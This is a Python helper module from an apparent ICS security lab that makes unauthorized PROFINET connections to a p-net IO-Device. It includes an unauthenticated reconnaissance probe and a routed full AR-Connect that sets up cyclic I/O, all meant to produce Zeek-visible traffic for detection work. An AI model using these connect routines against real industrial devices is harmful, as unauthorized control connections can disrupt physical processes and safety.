"""Shared PROFINET connect helper — works around a real bug found 2026-07-05
in `profinet-py` (f0rw4rd/profinet-py, PyPI `profinet-py`, v0.6.2).

`profinet.device.ProfinetDevice.start_cyclic()` calls `_ensure_connected()`
first, which does a PLAIN connect with no `iocr_setup` (AR type
0x0006 = IOSAR/DeviceAccess). p-net (the IO-Device stack used as the server
side here) only implements `IOCARSingle` (AR type 0x0001) — see its own
README: "Supports only full connections, not the limited 'DeviceAccess'
connection type." So `start_cyclic()`'s own first connect attempt is always
rejected by p-net before it ever reaches its second, correct
`rpc.connect(..., iocr_setup=...)` call further down.

Confirmed via `tshark`'s PROFINET dissector against a live capture: the
rejection is `ErrorCode1=0x01 (CONN_FAULTY_AR_BLOCK_REQ), ErrorCode2=0x04
(Error in Parameter ARType)`, and the response's own `ARBlockRes` field
echoes back `ARType: IO Supervisor AR / DeviceAccess AR (0x0006)` — proving
the REQUEST we sent used the wrong type, not a config content issue.
(profinet-py's own CLI error display is also byte-order-confused and always
shows the same misleading "[ErrorCode1=0x81, ErrorCode2=0xDB]" regardless of
the real error — those are just the fixed ErrorDecode/ErrorCode header bytes
leaking into the wrong display fields. Always verify with a real capture,
not the CLI's own error text.)

Workaround used here: call the low-level `RPCCon.connect(src_mac,
iocr_setup=..., with_alarm_cr=True)` DIRECTLY as the one and only connect —
never go through `ProfinetDevice.start_cyclic()`/`connect()`, and never call
profinet-py's own `cyclic` CLI subcommand (its "acyclic discover-slots, then
reconnect with IOCR" workflow hits the exact same bug at its own first
acyclic pre-connect step, for the same reason — it also assumes the target
already has I/O modules physically plugged in, which p-net's sample app does
NOT: p-net plugs modules ONLY reactively, from whatever the Connect
request's own ExpectedSubmoduleBlockReq declares).

This gets AR + IOCR negotiation to succeed (`ConnectResult.has_cyclic=True`,
real frame IDs assigned by the device) — confirmed working live 2026-07-05.
Actual live cyclic *data* exchange goes one step further and hits a
DIFFERENT, deeper wall: p-net aborts via a real-time alarm ("PDev: no port
offers required speed/duplexity") because the virtio virtual NIC reports no
real link speed/duplex, which p-net's real-time port validation requires.
That's a hardware/virtualization limitation, not a software bug — not
chased further; the Connect+IOCR-negotiation traffic itself (rich,
real, Zeek-visible PROFINET protocol.log / profinet_io_cm.log entries) is
already enough for detection/ATT&CK-technique purposes.

**Zeek/Malcolm visibility note**: DCP (Identify/Get/Set/Signal — raw
Ethernet, EtherType 0x8892, no IP) produces ZERO Malcolm log entries —
confirmed empirically (ran `signal`, checked OpenSearch for the exact time
window, zero hits). Only the UDP/IP-based AR-Connect/RPC exchange (port
34964, `network.protocol: "profinet"` / `"profinet_io_cm"`) is Zeek-visible.
This is why every technique below goes through the connect exchange rather
than plain DCP commands, unlike every other protocol in this lab where the
"cheap" recon/command primitives are directly visible.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass

from profinet import rpc as rpc_mod
from profinet.rpc import RPCCon, IOSlot, IOCRSetup
from profinet.util import ethernet_socket, get_mac

log = logging.getLogger("profinet_logic")

# p-net's own fixed vendor/device ID (confirmed from its real source,
# include/pnet_api.h / samples/pn_dev/app_gsdml.h — VendorID 0x0493
# "rt-labs AB", DeviceID 0x0002 "P-Net Sample Application").
PNET_VENDOR_ID = 0x0493
PNET_DEVICE_ID = 0x0002


@dataclass
class StaticDeviceInfo:
    """Minimal stand-in for profinet.dcp.DCPDeviceDescription.

    RPCCon's connect/RPC logic only ever reads `.ip`, `.name`,
    `.device_high/low`, `.vendor_high/low` (confirmed by grepping rpc.py) —
    never `.mac`. This lets a controller on a DIFFERENT L2 segment (e.g.
    kali-1, routed to the device's VLAN through vyos-1) connect straight by
    IP, since PROFINET's own DCP discovery is raw Ethernet multicast and
    can't cross a routed VLAN boundary the way the actual UDP/IP RPC
    exchange can (RPCCon uses a normal `(ip, port)` socket peer, not a raw
    frame requiring L2 adjacency to the device — confirmed by real testing:
    DCP-based `resolve_device()` fails outright from kali-1, but a direct
    IP connect using this stand-in succeeds).
    """

    ip: str
    name: str
    vendor_high: int = (PNET_VENDOR_ID >> 8) & 0xFF
    vendor_low: int = PNET_VENDOR_ID & 0xFF
    device_high: int = (PNET_DEVICE_ID >> 8) & 0xFF
    device_low: int = PNET_DEVICE_ID & 0xFF


def resolve_device_by_ip(ip: str, name: str, interface: str):
    """Build a StaticDeviceInfo + local src_mac without any DCP discovery.

    Use this (not resolve_device()) when the controller isn't on the same
    L2 segment as the device — e.g. kali-1 attacking across vyos-1's
    routing, where DCP's raw multicast can't reach the target at all.
    """
    src_mac = get_mac(interface)
    return StaticDeviceInfo(ip=ip, name=name), src_mac

# p-net sample app's GSDML-declared module/submodule idents
# (ansible/roles/ot/tasks/files/fins/ pattern: constants confirmed from real
# source, not guessed — see hefloryd/p-net samples/pn_dev/app_gsdml.h).
MOD_ID_DIGITAL_IN_OUT = 0x00000032
SUBMOD_ID_DIGITAL_IN_OUT = 0x00000132  # 8 bytes in + 8 bytes out
MOD_ID_ECHO = 0x00000040
SUBMOD_ID_ECHO = 0x00000140  # 8 bytes in + 8 bytes out

DEFAULT_SLOT = IOSlot(
    slot=1,
    subslot=1,
    input_length=8,
    output_length=8,
    module_ident=MOD_ID_DIGITAL_IN_OUT,
    submodule_ident=SUBMOD_ID_DIGITAL_IN_OUT,
)

ALT_SLOT = IOSlot(
    slot=1,
    subslot=1,
    input_length=8,
    output_length=8,
    module_ident=MOD_ID_ECHO,
    submodule_ident=SUBMOD_ID_ECHO,
)


def resolve_device(station_name: str, interface: str, timeout: float = 5.0):
    """DCP-resolve a station name to its DCPDeviceDescription (IP/MAC/etc.)."""
    sock = ethernet_socket(interface)
    src_mac = get_mac(interface)
    try:
        info = rpc_mod.get_station_info(sock, src_mac, station_name, timeout_sec=int(timeout))
        return info, src_mac
    finally:
        sock.close()


def acyclic_probe_connect(info, src_mac, timeout: float = 5.0):
    """Unauthenticated 'DeviceAccess' (acyclic-only) connect attempt.

    AR type 0x0006 — p-net does not support this AR type at all (device-stack
    limitation, not a bug), so this always gets rejected. The attempt itself
    is still a real, Zeek-visible Connect request/response exchange — used
    here to simulate reconnaissance (T0846): an unauthorized read/identify
    probe that the device flatly refuses, but that a real defender would see
    in their logs regardless of whether it succeeded.
    """
    conn = RPCCon(info, timeout=timeout)
    try:
        conn.connect(src_mac)
        return conn, None
    except Exception as exc:  # noqa: BLE001 - intentionally broad, expected to fail
        return conn, exc


def unauthorized_iocr_connect(info, src_mac, slot: IOSlot, timeout: float = 5.0):
    """Unauthorized full AR-Connect with a real IOCR (cyclic-IO) declaration.

    Calls the low-level RPCCon.connect() DIRECTLY as the one and only
    connect call (see module docstring for why this bypasses
    ProfinetDevice's broken start_cyclic()/connect() wrapper). Succeeds
    against p-net (real AR + IOCR established, has_cyclic=True) since this
    correctly uses AR type 0x0001 (IOCARSingle) from the very first request.
    """
    setup = IOCRSetup(
        slots=[slot],
        send_clock_factor=32,
        reduction_ratio=32,
        watchdog_factor=6,
        data_hold_factor=6,
    )
    conn = RPCCon(info, timeout=timeout)
    result = conn.connect(src_mac, with_alarm_cr=True, iocr_setup=setup)
    return conn, result
